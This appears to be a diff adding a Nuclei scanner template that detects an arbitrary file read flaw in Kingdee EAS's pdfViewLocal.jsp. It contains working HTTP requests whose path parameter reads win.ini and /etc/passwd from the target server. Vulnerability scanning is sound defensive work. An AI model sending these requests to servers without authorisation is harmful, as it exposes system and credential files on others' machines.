@@ -1,0 +1,48 @@
+id: kingdee-apusic-pdfviewlocal-arbitrary-file-read
+
+info:
+  name: Kingdee EAS pdfViewLocal Arbitrary File Read
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Kingdee EAS pdfViewLocal is vulnerable to arbitrary file read, allowing attackers to obtain sensitive information by accessing files on the server.
+  tags: 金蝶-APUSIC
+
+http:
+  - raw:
+      - |
+        GET /plt_document/fragments/content/pdfViewLocal.jsp?path=C:/Windows/win.ini HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
+        Accept: */*
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "bit app support"
+          - "fonts"
+          - "extensions"
+        condition: and
+
+      - type: status
+        status:
+          - 200
+      
+  - raw:
+      - |
+        GET /plt_document/fragments/content/pdfViewLocal.jsp?path=/etc/passwd HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
+        Accept: */*
+    
+    matchers-condition: and
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "root:.*:0:0:"
+      - type: status
+        status: 
+          - 200
